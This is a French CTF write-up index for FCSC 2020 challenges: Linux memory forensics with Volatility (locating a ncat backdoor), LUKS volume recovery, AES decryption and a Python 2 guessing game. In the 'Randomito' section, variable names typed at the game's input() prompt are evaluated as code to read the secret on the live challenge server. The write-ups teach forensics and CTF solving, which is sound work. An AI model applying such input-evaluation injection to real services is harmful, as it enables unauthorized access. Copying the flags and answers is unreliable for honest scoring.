onosh@kali:/home/onosh/FCSC/FORENSIC/CHAPARDEUR# tshark -r pws.pcap -T fields -e http.file_data frame.number eq 11614 Nous r\u00e9cup\u00e9rons le r\u00e9sultat en hexa : 2b003e3234097431296249164260181301363d06017e78501a13154363661b0501365f09491a5a10045718225c63453300691a1c552f04321946470655205c061125192c220f66277c49015508375047427c5b425c750c5213510d50506b5a1717205a15017a575d1502060007310d1246255f125329020544020d5a53675b4216250d165d7b54530b386a2763133833351133 M\u00eame manipulation que toute \u00e0 l'heure pour d\u00e9chiffrer les donn\u00e9es _DRAPEAU_P|us2peurQue2M4l! R4ssur3z-Votre-Am1-Et-vo1c1Votredr4peau_FCSC {469e8168718996ec83a92acd6fe6b9c03c6ced2a3a7e7a2089b534baae97a7} _DRAPEAU_","title":"\u00c9tape 3 - La cl\u00e9 XOR"},{"location":"ctf/fcsc2020/derobe/","text":"Acad\u00e9mie de l'investigation - Porte d\u00e9rob\u00e9e \u00c9nonc\u00e9 Un poste distant est connect\u00e9 au poste en cours d'analyse via une porte d\u00e9rob\u00e9e avec la capacit\u00e9 d'ex\u00e9cuter des commandes. Quel est le num\u00e9ro de port \u00e0 l'\u00e9coute de cette connexion ? Quelle est l'adresse IP distante connect\u00e9e au moment du dump ? Quel est l'horodatage de la cr\u00e9ation du processus en UTC de cette porte d\u00e9rob\u00e9e ? Format du flag : FCSC{port:IP:YYYY-MM-DD HH:MM:SS} dmp.tar.gz \u00c9tape 1 - Recherche de trace r\u00e9seau :) \u00c9videmment nous repartons avec volatility et le profil linux cr\u00e9\u00e9 \u00e0 cette occasion. L'\u00e9nonc\u00e9 nous dit que la backdoor est actuellement utilis\u00e9 par un attaquant, je pense donc rapidement \u00e0 une connexion \"ESTABLISHED\". J'utilise le plugin volatility linux_netstat qui permet de lister les sockets ouvert : onosh@kali:/home/onosh/FCSC/FORENSIC/volatility# python vol.py -f ../dmp/dmp.mem --profile=Linuxfcscdebianx64 linux_netstat |grep 'ESTAB' Volatility Foundation Volatility Framework 2.6.1 TCP 10.42.42.131 :36970 116.203.52.118 : 443 ESTABLISHED tor/706 TCP 10.42.42.131 :37252 163.172.182.147 : 443 ESTABLISHED tor/706 TCP fd:6663:7363:1000:c10b:6374:25f:dc37:36280 fd:6663:7363:1000:55cf:b9c6:f41d:cc24:58014 ESTABLISHED ncat/1515 TCP 10.42.42.131 :47106 216.58.206.226 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :55224 151.101.121.140 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :55226 151.101.121.140 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :53190 104.124.192.89 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :45652 35.190.72.21 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :47102 216.58.206.226 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :47104 216.58.206.226 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :38186 216.58.213.142 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :47100 216.58.206.226 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :50612 104.93.255.199 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :58772 185.199.111.154 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :38184 216.58.213.142 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :57000 10.42.42.134 : 22 ESTABLISHED ssh/119468 TCP fd:6663:7363:1000:c10b:6374:25f:dc37:36280 fd:6663:7363:1000:55cf:b9c6:f41d:cc24:58014 ESTABLISHED sh/119511 TCP 127.0.0.1 :38498 127.0.0.1 :34243 ESTABLISHED cli/119514 TCP 127.0.0.1 :34243 127.0.0.1 :38498 ESTABLISHED cli/119514 TCP 10.42.42.131 :51858 10.42.42.128 : 445 ESTABLISHED smbclient/119577 On voit rapidement un probl\u00e8me avec ncat... Je garde donc : l'adresse IP distante connect\u00e9e : fd:6663:7363:1000:55cf:b9c6:f41d:cc24 le num\u00e9ro de port \u00e0 l'\u00e9coute : 58014 Le pid qui peut servir : ncat/1515 \u00c9tape 2 - Recherche de l'horodatage Il ne manque plus que l'horodatage de la cr\u00e9ation du processus en UTC de cette porte d\u00e9rob\u00e9e. Pour cela, rien de mieux que le plugin linux_pslist et un petit grep sur le PID pour observer les dates de cr\u00e9ation. onosh@kali:/home/onosh/FCSC/FORENSIC/volatility# python vol.py -f ../dmp/dmp.mem --profile=Linuxfcscdebianx64 linux_pslist |grep 1515 Volatility Foundation Volatility Framework 2.6.1 0xffff9d72c014be00 ncat 1515 1513 1001 1001 0x000000003e3d0000 2020-03-26 23:24:20 UTC+0000 0xffff9d72c5d50000 sh 119511 1515 1001 1001 0x00000000128ac000 2020-03-26 23:32:36 UTC+0000 Logiquement le date de cr\u00e9ation de la porte d\u00e9rob\u00e9e est 2020-03-26 23:24:20 Le flag : FCSC{58014:fd:6663:7363:1000:55cf:b9c6:f41d:cc24:2020-03-26 23:24:20}","title":"3. Porte d\u00e9rob\u00e9e"},{"location":"ctf/fcsc2020/derobe/#academie-de-linvestigation-porte-derobee","text":"","title":"Acad\u00e9mie de l'investigation - Porte d\u00e9rob\u00e9e"},{"location":"ctf/fcsc2020/derobe/#enonce","text":"Un poste distant est connect\u00e9 au poste en cours d'analyse via une porte d\u00e9rob\u00e9e avec la capacit\u00e9 d'ex\u00e9cuter des commandes. Quel est le num\u00e9ro de port \u00e0 l'\u00e9coute de cette connexion ? Quelle est l'adresse IP distante connect\u00e9e au moment du dump ? Quel est l'horodatage de la cr\u00e9ation du processus en UTC de cette porte d\u00e9rob\u00e9e ? Format du flag : FCSC{port:IP:YYYY-MM-DD HH:MM:SS} dmp.tar.gz","title":"\u00c9nonc\u00e9"},{"location":"ctf/fcsc2020/derobe/#etape-1-recherche-de-trace-reseau","text":"\u00c9videmment nous repartons avec volatility et le profil linux cr\u00e9\u00e9 \u00e0 cette occasion. L'\u00e9nonc\u00e9 nous dit que la backdoor est actuellement utilis\u00e9 par un attaquant, je pense donc rapidement \u00e0 une connexion \"ESTABLISHED\". J'utilise le plugin volatility linux_netstat qui permet de lister les sockets ouvert : onosh@kali:/home/onosh/FCSC/FORENSIC/volatility# python vol.py -f ../dmp/dmp.mem --profile=Linuxfcscdebianx64 linux_netstat |grep 'ESTAB' Volatility Foundation Volatility Framework 2.6.1 TCP 10.42.42.131 :36970 116.203.52.118 : 443 ESTABLISHED tor/706 TCP 10.42.42.131 :37252 163.172.182.147 : 443 ESTABLISHED tor/706 TCP fd:6663:7363:1000:c10b:6374:25f:dc37:36280 fd:6663:7363:1000:55cf:b9c6:f41d:cc24:58014 ESTABLISHED ncat/1515 TCP 10.42.42.131 :47106 216.58.206.226 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :55224 151.101.121.140 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :55226 151.101.121.140 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :53190 104.124.192.89 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :45652 35.190.72.21 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :47102 216.58.206.226 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :47104 216.58.206.226 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :38186 216.58.213.142 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :47100 216.58.206.226 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :50612 104.93.255.199 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :58772 185.199.111.154 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :38184 216.58.213.142 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :57000 10.42.42.134 : 22 ESTABLISHED ssh/119468 TCP fd:6663:7363:1000:c10b:6374:25f:dc37:36280 fd:6663:7363:1000:55cf:b9c6:f41d:cc24:58014 ESTABLISHED sh/119511 TCP 127.0.0.1 :38498 127.0.0.1 :34243 ESTABLISHED cli/119514 TCP 127.0.0.1 :34243 127.0.0.1 :38498 ESTABLISHED cli/119514 TCP 10.42.42.131 :51858 10.42.42.128 : 445 ESTABLISHED smbclient/119577 On voit rapidement un probl\u00e8me avec ncat... Je garde donc : l'adresse IP distante connect\u00e9e : fd:6663:7363:1000:55cf:b9c6:f41d:cc24 le num\u00e9ro de port \u00e0 l'\u00e9coute : 58014 Le pid qui peut servir : ncat/1515","title":"\u00c9tape 1 - Recherche de trace r\u00e9seau :)"},{"location":"ctf/fcsc2020/derobe/#etape-2-recherche-de-lhorodatage","text":"Il ne manque plus que l'horodatage de la cr\u00e9ation du processus en UTC de cette porte d\u00e9rob\u00e9e. Pour cela, rien de mieux que le plugin linux_pslist et un petit grep sur le PID pour observer les dates de cr\u00e9ation. onosh@kali:/home/onosh/FCSC/FORENSIC/volatility# python vol.py -f ../dmp/dmp.mem --profile=Linuxfcscdebianx64 linux_pslist |grep 1515 Volatility Foundation Volatility Framework 2.6.1 0xffff9d72c014be00 ncat 1515 1513 1001 1001 0x000000003e3d0000 2020-03-26 23:24:20 UTC+0000 0xffff9d72c5d50000 sh 119511 1515 1001 1001 0x00000000128ac000 2020-03-26 23:32:36 UTC+0000 Logiquement le date de cr\u00e9ation de la porte d\u00e9rob\u00e9e est 2020-03-26 23:24:20 Le flag : FCSC{58014:fd:6663:7363:1000:55cf:b9c6:f41d:cc24:2020-03-26 23:24:20}","title":"\u00c9tape 2 - Recherche de l'horodatage"},{"location":"ctf/fcsc2020/findme/","text":"Find-Me \u00c9nonc\u00e9 Vous avez acc\u00e8s \u00e0 un fichier find_me qui semble renfermer un secret bien gard\u00e9, qui n'existe peut-\u00eatre m\u00eame plus. Retrouvez son contenu ! find_me \u00c9tape 1 - Analyse du fichier Le fichier find_me semble \u00eatre une partition syst\u00e8me : onosh@kali:/home/onosh/FCSC/FORENSIC/FINDME# file find_me find_me: Linux rev 1.0 ext4 filesystem data, UUID=9c0d2dc5-184c-496a-ba8e-477309e521d9, volume name \"find_me\" (needs journal recovery) (extents) (64bit) (large files) (huge files) Je d\u00e9cide de monter la partition : root@siftworkstation -> /h/bsi # mkdir /mnt/fcsc && mount /home/bsi/vms-share/fcsc2/find_me /mnt/fcsc root@siftworkstation -> /h/bsi # ls /mnt/fcsc/ lost+found pass.b64 unlock_me 2 fichiers et 1 dossiers apparaissent. root@siftworkstation -> /m/fcsc # file * lost+found: directory pass.b64: ASCII text unlock_me: LUKS encrypted file, ver 1 [aes, xts-plain64, sha256] UUID: 220745be-23df-4ef8-bff0-a36ab5cd1eff lost+found est un dossier, actuellement vide, il permet habituellement de r\u00e9cup\u00e9rer des fichiers supprim\u00e9s sous linux pass.b64 est un fichier texte : root@siftworkstation -> /m/fcsc # cat pass.b64 nothing here. password splited! On apprend que le mot de passe a \u00e9t\u00e9 s\u00e9par\u00e9 en plusieurs morceaux. - unlock_me est un volume chiffr\u00e9 Luks \u00c9tape 2 - R\u00e9cup\u00e9ration des fichiers Pour r\u00e9cup\u00e9rer les fichiers potentiellement supprim\u00e9 sur la partition j'ai utilis\u00e9 le tr\u00e8s efficace Autopsy . Il suffit d'importer la partition find_me dans le logiciel : On voit rapidement que des fichiers ont \u00e9t\u00e9 supprim\u00e9s : Chaque fichier partXX contient deux caract\u00e8res : Le fichier pass.b64 disait nothing here. password splited! , si on reconstitue une chaine gr\u00e2\u00e7e aux caract\u00e8res on obtient quelque chose qui ressemble \u00e9trangement \u00e0 du base64 TWYtOVkyb01OWm5IWEtzak04cThuUlRUOHgzVWRZ Rappelons nous, le nom du fichier contenu dans la partition find_me \u00e9tait pass.b64 Ouverture du volume Luks J'essaye d'ouvrir le volume Luks avec la cl\u00e9 en base64, mais cela \u00e9choue : root@siftworkstation -> /m/fcsc # cryptsetup luksOpen unlock_me BRIOCHE Enter passphrase for unlock_me: TWYtOVkyb01OWm5IWEtzak04cThuUlRUOHgzVWRZ Bad passphrase ! J'essaye d'ouvrir le volume Luks avec la cl\u00e9 d\u00e9cod\u00e9, yes ! Mf-9Y2oMNZnHXKsjM8q8nRTT8x3UdY root@siftworkstation -> /m/fcsc # cryptsetup luksOpen /unlock_me BRIOCHE Enter passphrase for /unlock_me: Mf-9Y2oMNZnHXKsjM8q8nRTT8x3UdY root@siftworkstation -> /m/fcsc # mkdir /mnt/flag root@siftworkstation -> /m/fcsc # mount /dev/mapper/BRIOCHE /mnt/flag/ root@siftworkstation -> /m/fcsc # ls /mnt/flag/ root@siftworkstation -> /m/fcsc # ls -Al /mnt/flag/ total 0 -r-------- 1 root root 70 Apr 1 19:54 .you_found_me root@siftworkstation -> /m/fcsc # cat /mnt/flag/.you_found_me FCSC{750322d61518672328c856ff72fac0a80220835b9864f60451c771ce6f9aeca1}","title":"Find Me"},{"location":"ctf/fcsc2020/findme/#find-me","text":"","title":"Find-Me"},{"location":"ctf/fcsc2020/findme/#enonce","text":"Vous avez acc\u00e8s \u00e0 un fichier find_me qui semble renfermer un secret bien gard\u00e9, qui n'existe peut-\u00eatre m\u00eame plus. Retrouvez son contenu ! find_me","title":"\u00c9nonc\u00e9"},{"location":"ctf/fcsc2020/findme/#etape-1-analyse-du-fichier","text":"Le fichier find_me semble \u00eatre une partition syst\u00e8me : onosh@kali:/home/onosh/FCSC/FORENSIC/FINDME# file find_me find_me: Linux rev 1.0 ext4 filesystem data, UUID=9c0d2dc5-184c-496a-ba8e-477309e521d9, volume name \"find_me\" (needs journal recovery) (extents) (64bit) (large files) (huge files) Je d\u00e9cide de monter la partition : root@siftworkstation -> /h/bsi # mkdir /mnt/fcsc && mount /home/bsi/vms-share/fcsc2/find_me /mnt/fcsc root@siftworkstation -> /h/bsi # ls /mnt/fcsc/ lost+found pass.b64 unlock_me 2 fichiers et 1 dossiers apparaissent. root@siftworkstation -> /m/fcsc # file * lost+found: directory pass.b64: ASCII text unlock_me: LUKS encrypted file, ver 1 [aes, xts-plain64, sha256] UUID: 220745be-23df-4ef8-bff0-a36ab5cd1eff lost+found est un dossier, actuellement vide, il permet habituellement de r\u00e9cup\u00e9rer des fichiers supprim\u00e9s sous linux pass.b64 est un fichier texte : root@siftworkstation -> /m/fcsc # cat pass.b64 nothing here. password splited! On apprend que le mot de passe a \u00e9t\u00e9 s\u00e9par\u00e9 en plusieurs morceaux. - unlock_me est un volume chiffr\u00e9 Luks","title":"\u00c9tape 1 - Analyse du fichier"},{"location":"ctf/fcsc2020/findme/#etape-2-recuperation-des-fichiers","text":"Pour r\u00e9cup\u00e9rer les fichiers potentiellement supprim\u00e9 sur la partition j'ai utilis\u00e9 le tr\u00e8s efficace Autopsy . Il suffit d'importer la partition find_me dans le logiciel : On voit rapidement que des fichiers ont \u00e9t\u00e9 supprim\u00e9s : Chaque fichier partXX contient deux caract\u00e8res : Le fichier pass.b64 disait nothing here. password splited! , si on reconstitue une chaine gr\u00e2\u00e7e aux caract\u00e8res on obtient quelque chose qui ressemble \u00e9trangement \u00e0 du base64 TWYtOVkyb01OWm5IWEtzak04cThuUlRUOHgzVWRZ Rappelons nous, le nom du fichier contenu dans la partition find_me \u00e9tait pass.b64","title":"\u00c9tape 2 - R\u00e9cup\u00e9ration des fichiers"},{"location":"ctf/fcsc2020/findme/#ouverture-du-volume-luks","text":"J'essaye d'ouvrir le volume Luks avec la cl\u00e9 en base64, mais cela \u00e9choue : root@siftworkstation -> /m/fcsc # cryptsetup luksOpen unlock_me BRIOCHE Enter passphrase for unlock_me: TWYtOVkyb01OWm5IWEtzak04cThuUlRUOHgzVWRZ Bad passphrase ! J'essaye d'ouvrir le volume Luks avec la cl\u00e9 d\u00e9cod\u00e9, yes ! Mf-9Y2oMNZnHXKsjM8q8nRTT8x3UdY root@siftworkstation -> /m/fcsc # cryptsetup luksOpen /unlock_me BRIOCHE Enter passphrase for /unlock_me: Mf-9Y2oMNZnHXKsjM8q8nRTT8x3UdY root@siftworkstation -> /m/fcsc # mkdir /mnt/flag root@siftworkstation -> /m/fcsc # mount /dev/mapper/BRIOCHE /mnt/flag/ root@siftworkstation -> /m/fcsc # ls /mnt/flag/ root@siftworkstation -> /m/fcsc # ls -Al /mnt/flag/ total 0 -r-------- 1 root root 70 Apr 1 19:54 .you_found_me root@siftworkstation -> /m/fcsc # cat /mnt/flag/.you_found_me FCSC{750322d61518672328c856ff72fac0a80220835b9864f60451c771ce6f9aeca1}","title":"Ouverture du volume Luks"},{"location":"ctf/fcsc2020/leratconteur/","text":"Le Rat conteur \u00c9nonc\u00e9 Le fichier suivant a \u00e9t\u00e9 chiffr\u00e9 en AES-128 en mode CTR, avec la cl\u00e9 de 128 bits 00112233445566778899aabbccddeeff et un IV nul. \u00c0 vous de le d\u00e9chiffrer pour obtenir le flag. flag.jpg.enc D\u00e9chiffrement Cette commande permet de d\u00e9chiffrer le fichier flag.jpg.enc \u00e0 partir de la cl\u00e9 de donn\u00e9e. L'IV doit avoir la m\u00eame longueur que la cl\u00e9 pour que le d\u00e9chiffrement fonctionne. openssl enc -d -aes-128-ctr -K 00112233445566778899aabbccddeeff -iv 00000000000000000000000000000000 -in flag.jpg.enc -out flag.jpg","title":"Le rat conteur"},{"location":"ctf/fcsc2020/leratconteur/#le-rat-conteur","text":"","title":"Le Rat conteur"},{"location":"ctf/fcsc2020/leratconteur/#enonce","text":"Le fichier suivant a \u00e9t\u00e9 chiffr\u00e9 en AES-128 en mode CTR, avec la cl\u00e9 de 128 bits 00112233445566778899aabbccddeeff et un IV nul. \u00c0 vous de le d\u00e9chiffrer pour obtenir le flag. flag.jpg.enc","title":"\u00c9nonc\u00e9"},{"location":"ctf/fcsc2020/leratconteur/#dechiffrement","text":"Cette commande permet de d\u00e9chiffrer le fichier flag.jpg.enc \u00e0 partir de la cl\u00e9 de donn\u00e9e. L'IV doit avoir la m\u00eame longueur que la cl\u00e9 pour que le d\u00e9chiffrement fonctionne. openssl enc -d -aes-128-ctr -K 00112233445566778899aabbccddeeff -iv 00000000000000000000000000000000 -in flag.jpg.enc -out flag.jpg","title":"D\u00e9chiffrement"},{"location":"ctf/fcsc2020/randomito/","text":"Randomito \u00c9nonc\u00e9 Pourrez-vous deviner le secret al\u00e9atoire g\u00e9n\u00e9r\u00e9 ? randomyto.py Analyse du script #!/usr/local/bin/python2 import sys import signal from random import randint # Time allowed to answer (seconds) DELAY = 10 def handler(signum, frame): raise Exception(\"Time is up!\\n\") def p(s): sys.stdout.write(s) sys.stdout.flush() def challenge(): for _ in range(10): p(\"[+] Generating a 128-bit random secret (a, b)\\n\") secret_a = randint(0, 2**64 - 1) secret_b = randint(0, 2**64 - 1) secret = \"{:016x}{:016x}\".format(secret_a, secret_b) p(\"[+] Done! Now, try go guess it!\\n\") p(\">>> a = \") a = int(input()) p(\">>> b = \") b = int(input()) check = \"{:016x}{:016x}\".format(a, b) p(\"[-] Trying {}\\n\".format(check)) if check == secret: flag = open(\"flag.txt\").read() p(\"[+] Well done! Here is the flag: {}\\n\".format(flag)) break else: p(\"[!] Nope, it started by {}. Please try again.\\n\".format(secret[:5])) if __name__ == \"__main__\": signal.alarm(DELAY) signal.signal(signal.SIGALRM, handler) try: challenge() except Exception, e: exit(0) else: exit(0) Le script g\u00e9n\u00e8re deux secrets, secret_a et secret_b Ils contiennent un nombre compris entre 1 et 2^64-1 secret_a = randint(0, 2**64 - 1) secret_b = randint(0, 2**64 - 1) Ils sont ensuite converti en h\u00e9xad\u00e9cimal et concat\u00e9n\u00e9. secret = \"{:016x}{:016x}\".format(secret_a, secret_b) On voit aussi qu'il y a un d\u00e9lais pour trouver le secret DELAY = 10 if __name__ == \"__main__\": signal.alarm(DELAY) signal.signal(signal.SIGALRM, handler) Debug J'ai ajout\u00e9 un d\u00e9lais plus large + print des secrets #!/usr/local/bin/python2 import sys import signal from random import randint # Time allowed to answer (seconds) DELAY = 1000000000 def handler(signum, frame): raise Exception(\"Time is up!\\n\") def p(s): sys.stdout.write(s) sys.stdout.flush() def challenge(): for _ in range(10): p(\"[+] Generating a 128-bit random secret (a, b)\\n\") secret_a = randint(0, 2**64 - 1) print(secret_a) secret_b = randint(0, 2**64 - 1) print(secret_b) secret = \"{:016x}{:016x}\".format(secret_a, secret_b) print(secret) p(\"[+] Done! Now, try go guess it!\\n\") p(\">>> a = \") a = int(input()) p(\">>> b = \") b = int(input()) check = \"{:016x}{:016x}\".format(a, b) p(\"[-] Trying {}\\n\".format(check)) if check == secret: #flag = open(\"flag.txt\").read() flag = \"OK FLAG\" p(\"[+] Well done! Here is the flag: {}\\n\".format(flag)) break else: p(\"[!] Nope, it started by {}. Please try again.\\n\".format(secret[:5])) if __name__ == \"__main__\": signal.alarm(DELAY) signal.signal(signal.SIGALRM, handler) try: challenge() except Exception, e: exit(0) else: exit(0) Si on test une \u00e9x\u00e9cution : onosh@kali:/home/onosh/FCSC/MISC# python randomito.py [+] Generating a 128-bit random secret (a, b) 16141621770963719195 12208871211096206965 e0028f7a8d01141ba96e9fae5de1ee75 [+] Done! Now, try go guess it! >>> a = 16141621770963719195 >>> b = 12208871211096206965 [-] Trying e0028f7a8d01141ba96e9fae5de1ee75 [+] Well done! Here is the flag: OK FLAG Mais alors comment trouver le secret en 10 secondes ? Simplement en lui donnant ce qu'il attend : onosh@kali:/home/onosh/FCSC/MISC# python randomito.py [+] Generating a 128-bit random secret (a, b) 6141270817308741848 5049640784231285106 553a2d453f2910d84613ed8a036e4172 [+] Done! Now, try go guess it! >>> a = secret_a >>> b = secret_b [-] Trying 553a2d453f2910d84613ed8a036e4172 [+] Well done! Here is the flag: OK FLAG Il n'y a plus qu'\u00e0 tester en r\u00e9el : onosh@kali:/home/onosh/FCSC/MISC# nc challenges2.france-cybersecurity-challenge.fr 6001 [+] Generating a 128-bit random secret (a, b) [+] Done! Now, try go guess it! >>> a = secret_a >>> b = secret_b [-] Trying d955218681608306fc0e9b492dbdda1c [+] Well done! Here is the flag: FCSC{4496d11d19db92ae53e0b9e9415d99d877ebeaeab99e9e875ac346c73e8aca77}","title":"Randomito"},{"location":"ctf/fcsc2020/randomito/#randomito","text":"","title":"Randomito"},{"location":"ctf/fcsc2020/randomito/#enonce","text":"Pourrez-vous deviner le secret al\u00e9atoire g\u00e9n\u00e9r\u00e9 ? randomyto.py","title":"\u00c9nonc\u00e9"},{"location":"ctf/fcsc2020/randomito/#analyse-du-script","text":"#!/usr/local/bin/python2 import sys import signal from random import randint # Time allowed to answer (seconds) DELAY = 10 def handler(signum, frame): raise Exception(\"Time is up!\\n\") def p(s): sys.stdout.write(s) sys.stdout.flush() def challenge(): for _ in range(10): p(\"[+] Generating a 128-bit random secret (a, b)\\n\") secret_a = randint(0, 2**64 - 1) secret_b = randint(0, 2**64 - 1) secret = \"{:016x}{:016x}\".format(secret_a, secret_b) p(\"[+] Done! Now, try go guess it!\\n\") p(\">>> a = \") a = int(input()) p(\">>> b = \") b = int(input()) check = \"{:016x}{:016x}\".format(a, b) p(\"[-] Trying {}\\n\".format(check)) if check == secret: flag = open(\"flag.txt\").read() p(\"[+] Well done! Here is the flag: {}\\n\".format(flag)) break else: p(\"[!] Nope, it started by {}. Please try again.\\n\".format(secret[:5])) if __name__ == \"__main__\": signal.alarm(DELAY) signal.signal(signal.SIGALRM, handler) try: challenge() except Exception, e: exit(0) else: exit(0) Le script g\u00e9n\u00e8re deux secrets, secret_a et secret_b Ils contiennent un nombre compris entre 1 et 2^64-1 secret_a = randint(0, 2**64 - 1) secret_b = randint(0, 2**64 - 1) Ils sont ensuite converti en h\u00e9xad\u00e9cimal et concat\u00e9n\u00e9. secret = \"{:016x}{:016x}\".format(secret_a, secret_b) On voit aussi qu'il y a un d\u00e9lais pour trouver le secret DELAY = 10 if __name__ == \"__main__\": signal.alarm(DELAY) signal.signal(signal.SIGALRM, handler)","title":"Analyse du script"},{"location":"ctf/fcsc2020/randomito/#debug","text":"J'ai ajout\u00e9 un d\u00e9lais plus large + print des secrets #!/usr/local/bin/python2 import sys import signal from random import randint # Time allowed to answer (seconds) DELAY = 1000000000 def handler(signum, frame): raise Exception(\"Time is up!\\n\") def p(s): sys.stdout.write(s) sys.stdout.flush() def challenge(): for _ in range(10): p(\"[+] Generating a 128-bit random secret (a, b)\\n\") secret_a = randint(0, 2**64 - 1) print(secret_a) secret_b = randint(0, 2**64 - 1) print(secret_b) secret = \"{:016x}{:016x}\".format(secret_a, secret_b) print(secret) p(\"[+] Done! Now, try go guess it!\\n\") p(\">>> a = \") a = int(input()) p(\">>> b = \") b = int(input()) check = \"{:016x}{:016x}\".format(a, b) p(\"[-] Trying {}\\n\".format(check)) if check == secret: #flag = open(\"flag.txt\").read() flag = \"OK FLAG\" p(\"[+] Well done! Here is the flag: {}\\n\".format(flag)) break else: p(\"[!] Nope, it started by {}. Please try again.\\n\".format(secret[:5])) if __name__ == \"__main__\": signal.alarm(DELAY) signal.signal(signal.SIGALRM, handler) try: challenge() except Exception, e: exit(0) else: exit(0) Si on test une \u00e9x\u00e9cution : onosh@kali:/home/onosh/FCSC/MISC# python randomito.py [+] Generating a 128-bit random secret (a, b) 16141621770963719195 12208871211096206965 e0028f7a8d01141ba96e9fae5de1ee75 [+] Done! Now, try go guess it! >>> a = 16141621770963719195 >>> b = 12208871211096206965 [-] Trying e0028f7a8d01141ba96e9fae5de1ee75 [+] Well done! Here is the flag: OK FLAG Mais alors comment trouver le secret en 10 secondes ? Simplement en lui donnant ce qu'il attend : onosh@kali:/home/onosh/FCSC/MISC# python randomito.py [+] Generating a 128-bit random secret (a, b) 6141270817308741848 5049640784231285106 553a2d453f2910d84613ed8a036e4172 [+] Done! Now, try go guess it! >>> a = secret_a >>> b = secret_b [-] Trying 553a2d453f2910d84613ed8a036e4172 [+] Well done! Here is the flag: OK FLAG Il n'y a plus qu'\u00e0 tester en r\u00e9el : onosh@kali:/home/onosh/FCSC/MISC# nc challenges2.france-cybersecurity-challenge.fr 6001 [+] Generating a 128-bit random secret (a, b) [+] Done! Now, try go guess it! >>> a = secret_a >>> b = secret_b [-] Trying d955218681608306fc0e9b492dbdda1c [+] Well done! Here is the flag: FCSC{4496d11d19db92ae53e0b9e9415d99d877ebeaeab99e9e875ac346c73e8aca77}","title":"Debug"},{"location":"ctf/fcsc2020/rentree/","text":"Acad\u00e9mie de l'investigation - C'est la rentr\u00e9e \u00c9nonc\u00e9 Bienvenue \u00e0 l'acad\u00e9mie de l'investigation num\u00e9rique ! Votre mission, valider un maximum d'\u00e9tapes de cette s\u00e9rie afin de d\u00e9montrer votre dext\u00e9rit\u00e9 en analyse m\u00e9moire GNU/Linux. Premi\u00e8re \u00e9tape : retrouvez le HOSTNAME, le nom de l'utilisateur authentifi\u00e9 lors du dump et la version de Linux sur lequel le dump a \u00e9t\u00e9 fait. Format du flag : FCSC{hostname:user:x.x.x-x-amdxx} dmp.tar.gz \u00c9tape 1 - Le Hostname Pour ce premier challenge forensic de l'FCSC, nous commencons les analyses avec strings et grep, les informations demand\u00e9s ne sont pas trop pouss\u00e9s et cela devrait suffir. J'essaye de jouer sur les variables d'environnement pour le hostname onosh@kali:/home/onosh/FCSC/FORENSIC/volatility# strings ../dmp/dmp.mem |grep -nH --color 'HOSTNAME' 70069:XAUTHLOCALHOSTNAME= 787892:RESOLVE-HOSTNAME%s %s 1060239:PWMGR_NUM_PASSWORDS_PER_HOSTNAME 1466026:XAUTHLOCALHOSTNAME 1492253:PWMGR_NUM_PASSWORDS_PER_HOSTNAME 1917088:NM_DHCP_HOSTNAME_FLAG_NONE 2067905:HOSTNAME 2352591:NO_HOSTNAME_SPECIFIED 2461029:XAUTHLOCALHOSTNAME 2539984:HOSTNAME 2539985:HOSTNAME 2844373:RESOLVE-HOSTNAME%s %s 2984831:HOSTNAME 3173881:_HOSTNAME=challenge.fcsc 3257537:HOSTNAME Bingo ! On a quelque chose de pas mal avec challenge.fcsc \u00c9tape 2 - Le nom d'utilisateur authentifi\u00e9 Pour le nom d'utilisateur, j'ai essay\u00e9 de reproduire ce que l'on voit g\u00e9n\u00e9ralement dans le prompt d'un terminal c'est \u00e0 dire user@hostname, et je prend celui qui ai le plus apparu :) onosh@kali:/home/onosh/FCSC/FORENSIC/volatility# strings ../dmp/dmp.mem |grep --color '@challenge' |awk -F' ' '{print $1}' |sort |uniq -c |sort -n 1 +($debian_chroot)}root@challenge:~# 1 +($debian_chroot)}root@challenge:~/LiME/src# 1 ge@challenge: 1 )}root@challenge:~# 2 Lesage@challenge@ 4 esage@challenge: 4 Lesage@challenge:~$ 6 Lesage@challenge:~/Documents$ 8 [01;32mLesage@challenge 8 ]0;Lesage@challenge: 9 root@challenge:~/LiME/src# 17 root@challenge:~# 78 Lesage@challenge: Nous avons donc l'utilisateur Lesage \u00c9tape 3 - La version de Linux Ici on attend certainement une version de kernel linux, on peut le d\u00e9duire gr\u00e2ce au format du flag : x.x.x-x-amdxx onosh@kali:/home/onosh/FCSC/FORENSIC/volatility# strings ../dmp/dmp.mem |grep --color 'amd64' BOOT_IMAGE=/boot/vmlinuz-5.4.0-4-amd64 root=UUID=536c82dd-f1c5-43ce-b65d-c94e5c4a5031 ro quiet 5.4.0-4-amd64 (debian-kernel@lists.debian.org) (gcc version 9.2.1 20200203 (Debian 9.2.1-28)) #1 SMP Debian 5.4.19-1 (2020-02-13) Linux 5.4.0-4-amd64 Debian GNU/Linux bullseye/sid 5.4.0-4-amd64 /usr/lib/jvm/java-11-openjdk-amd64/lib /usr/lib/jvm/java-11-openjdk-amd64/lib/libnio.so /usr/lib/jvm/java-11-openjdk-amd64/lib/javaplugin.jar /usr/lib/jvm/java-11-openjdk-amd64/lib/libjimage.so /usr/lib/jvm/java-11-openjdk-amd64/lib/libzip.so 